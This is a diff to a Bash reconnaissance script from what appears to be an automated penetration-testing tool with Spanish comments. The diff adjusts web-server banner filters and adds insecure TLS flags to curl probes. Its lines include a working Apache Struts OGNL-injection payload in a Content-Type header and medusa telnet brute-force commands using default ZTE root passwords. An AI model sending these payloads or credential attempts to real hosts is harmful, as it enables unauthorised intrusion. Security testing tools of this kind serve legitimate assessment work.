@@ -1660,7 +1660,7 @@ then
 							curl --max-time 2 http://$subdominio:$port/nonexist123  > logs/enumeracion/$subdominio-$port-debugHabilitado.txt 2>/dev/null
 							egrep -i  --color=never "Django|laravel" logs/enumeracion/$subdominio-$port-debugHabilitado.txt > .enumeracion/$subdominio-$port-debugHabilitado.txt
   							###  if the server is apache ######
-							egrep -i "apache|nginx" .enumeracion/$subdominio-$port-webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal" # solo el segundo egrep poner "-q"
+							egrep -i "apache|nginx" .enumeracion/$subdominio-$port-webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga" # solo el segundo egrep poner "-q"
 							greprc=$?
 							if [[ $greprc -eq 0 && ! -f .enumeracion/$subdominio-$port-webarchivos.txt  ]];then # si el banner es Apache y no se enumero antes				
 												
@@ -1688,7 +1688,7 @@ then
 							####################################	
 							
 							#######  if the server is IIS ######
-							grep -i IIS .enumeracion/$subdominio-$port-webData.txt | egrep -qiv "302 Found" # no redirecciona
+							grep -i IIS .enumeracion/$subdominio-$port-webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga"  # no redirecciona
 							greprc=$?
 							if [[ $greprc -eq 0 && ! -f .enumeracion/$subdominio-$port-webarchivos.txt  ]];then # si el banner es IIS y no se enumero antes							
 								echo -e "\t[+] Revisando directorios y archivos comunes (IIS)"					
@@ -1867,7 +1867,7 @@ then
 					
 					
 				#######  if the server is IIS ######
-				grep -i IIS .enumeracion/$ip-$port-webData.txt | egrep -qiv "302 Found" # no redirecciona
+				grep -i IIS .enumeracion/$ip-$port-webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga"  # no redirecciona
 				greprc=$?
 				if [[ $greprc -eq 0 && ! -f .enumeracion/$ip-$port-webarchivos.txt  ]];then # si el banner es IIS y no se enumero antes
 				   #nmap -n -p $port --script http-vuln-cve2015-1635 $ip > logs/vulnerabilidades/$ip-$port-HTTPsys.txt 2>/dev/null 
@@ -1910,7 +1910,7 @@ then
 		
 		
 				#######  if the server is apache ######
-				egrep -i "apache|nginx" .enumeracion/$ip-$port-webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal" # solo el segundo egrep poner "-q"
+				egrep -i "apache|nginx" .enumeracion/$ip-$port-webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga" # solo el segundo egrep poner "-q"
 				greprc=$?
 				if [[ $greprc -eq 0 && ! -f .enumeracion/$ip-$port-webarchivos.txt  ]];then # si el banner es Apache y no se enumero antes				
 												
@@ -2054,10 +2054,10 @@ then
 						egrep -iq "302 Found|500 Proxy Error" .enumeracion/$subdominio-$port-webData.txt
 						greprc=$?
 						if [[ $greprc -eq 1 ]];then # no redirecciona a otro dominio o es error de proxy							
-							curl --max-time 2 https://$subdominio:$port/nonexist123  > logs/enumeracion/$subdominio-$port-debugHabilitado.txt 2>/dev/null
+							curl --insecure --max-time 2 https://$subdominio:$port/nonexist123  > logs/enumeracion/$subdominio-$port-debugHabilitado.txt 2>/dev/null
 							egrep -i  --color=never "Django|laravel" logs/enumeracion/$subdominio-$port-debugHabilitado.txt > .enumeracion/$subdominio-$port-debugHabilitado.txt
 							###  if the server is apache ######
-							egrep -i "apache|nginx" .enumeracion/$subdominio-$port-webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal" # solo el segundo egrep poner "-q"
+							egrep -i "apache|nginx" .enumeracion/$subdominio-$port-webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga" # solo el segundo egrep poner "-q"
 							greprc=$?
 							if [[ $greprc -eq 0 && ! -f .enumeracion/$subdominio-$port-webarchivos.txt  ]];then # si el banner es Apache y no se enumero antes				
 												
@@ -2079,7 +2079,7 @@ then
 							####################################	
 							
 							#######  if the server is IIS ######
-							grep -i IIS .enumeracion/$subdominio-$port-webData.txt | egrep -qiv "302 Found" # no redirecciona
+							grep -i IIS .enumeracion/$subdominio-$port-webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga"  # no redirecciona
 							greprc=$?
 							if [[ $greprc -eq 0 && ! -f .enumeracion/$subdominio-$port-webarchivos.txt  ]];then # si el banner es IIS y no se enumero antes							
 								echo -e "\t[+] Revisando directorios y archivos comunes (IIS)"					
@@ -2105,7 +2105,7 @@ then
 							greprc=$?				
 							if [[ $greprc -eq 0 && ! -f .enumeracion/$subdominio-$port-webarchivos.txt  ]];then # si el banner es Java y no se enumero antes
 								echo -e "\t[+] Revisando Apache struts"
-								curl --max-time 2 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable')).(#ros.flush())}" "https://$subdominio:$port/" > .vulnerabilidades/$subdominio-$port-apacheStruts.txt  2>/dev/null
+								curl --insecure --max-time 2 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable')).(#ros.flush())}" "https://$subdominio:$port/" > .vulnerabilidades/$subdominio-$port-apacheStruts.txt  2>/dev/null
 								
 								echo -e "\t[+] Revisando directorios y archivos comunes (JSP)"
 								web-buster.pl -t $subdominio -p $port -h 5 -d / -m tomcat -s 1 -q 1 | egrep --color=never "^200|^301|^401|^302" >> .enumeracion/$subdominio-$port-webarchivos.txt  &			
@@ -2197,7 +2197,7 @@ then
 			  fi # revisar por dominio
 				################################
 								
-				curl --max-time 2 https://$ip:$port/nonexist123  > logs/enumeracion/$ip-$port-debugHabilitado.txt 2>/dev/null
+				curl --insecure --max-time 2 https://$ip:$port/nonexist123  > logs/enumeracion/$ip-$port-debugHabilitado.txt 2>/dev/null
 				egrep -i  --color=never "Django|laravel" logs/enumeracion/$ip-$port-debugHabilitado.txt > .enumeracion/$ip-$port-debugHabilitado.txt
 					
 				######## heartbleed (IP) ##########
@@ -2245,7 +2245,7 @@ then
 					
 																							
 				#######  if the server is apache ######
-				egrep -i "apache|nginx" .enumeracion/$ip-$port-webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal" # solo el segundo egrep poner "-q"
+				egrep -i "apache|nginx" .enumeracion/$ip-$port-webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga" # solo el segundo egrep poner "-q"
 				greprc=$?				
 				if [[ $greprc -eq 0 && ! -f .enumeracion/$ip-$port-webarchivos.txt  ]];then # si el banner es Apache y no se enumero antes
 					
@@ -2267,7 +2267,7 @@ then
 				####################################
 		
 				#######  if the server is IIS ######
-				grep -qi IIS .enumeracion/$ip-$port-webData.txt | egrep -qiv "302 Found" 
+				grep -qi IIS .enumeracion/$ip-$port-webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga" 
 				greprc=$?
 				if [[ $greprc -eq 0 && ! -f .enumeracion/$ip-$port-webarchivos.txt  ]];then # si el banner es IIS y no se enumero antes					
 					echo -e "\n### $ip:$port ( IIS - HTTPsys)"
@@ -2296,7 +2296,7 @@ then
 				greprc=$?				
 				if [[ $greprc -eq 0 && ! -f .enumeracion/$ip-$port-webarchivos.txt  ]];then # si el banner es JAVA y no se enumero antes				
 					echo -e "\t[+] Revisando Apache struts"					
-					curl --max-time 2 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable')).(#ros.flush())}" "https://$ip:$port/" > logs/vulnerabilidades/$ip-$port-apacheStruts.txt 2>/dev/null
+					curl --insecure --max-time 2 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable')).(#ros.flush())}" "https://$ip:$port/" > logs/vulnerabilidades/$ip-$port-apacheStruts.txt 2>/dev/null
 					cp logs/vulnerabilidades/$ip-$port-apacheStruts.txt .vulnerabilidades/$ip-$port-apacheStruts.txt 
 					
 					echo -e "\t[+] Revisando directorios y archivos comunes (tomcat)"						
@@ -2415,6 +2415,9 @@ then
 	#insert clean data	
 	insert_data	 		
 fi
+
+
+find logs -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
 
 ########## revisando PROPFIND (webdav) ###
 grep PROPFIND .enumeracion2/* 2>/dev/null| while read -r line ; do
@@ -2763,8 +2766,6 @@ getBanners.pl -l .datos/total-host-vivos.txt -t .nmap/nmap-tcp.grep
 	################################
 
 find .servicios -size  0 -print0 |xargs -0 rm 2>/dev/null
-
-
 
 # UPNP
 if [ -f .servicios/upnp.txt ]
@@ -3346,8 +3347,7 @@ then
 			medusa -h $ip -u root -p Zte521 -M telnet >> logs/vulnerabilidades/$ip-admin-ZTE.txt 2>/dev/null
 			medusa -h $ip -u root -p 'W!n0&oO7.' -M telnet >> logs/vulnerabilidades/$ip-admin-ZTE.txt 2>/dev/null
 			
-			grep --color=never SUCCESS logs/vulnerabilidades/$ip-admin-ZTE.txt > .vulnerabilidades/$ip-admin-ZTE.txt 2>dev/null
-			cp logs/vulnerabilidades/$ip-admin-ZTE.txt .vulnerabilidades/$ip-zte:23-passwordDefecto.txt
+			grep --color=never SUCCESS logs/vulnerabilidades/$ip-admin-ZTE.txt > .vulnerabilidades/$ip-23-passwordDefecto.txt 2>dev/null			
 		fi
 		#exploit 
 		#sendcmd 1 DB p DevAuthInfo			
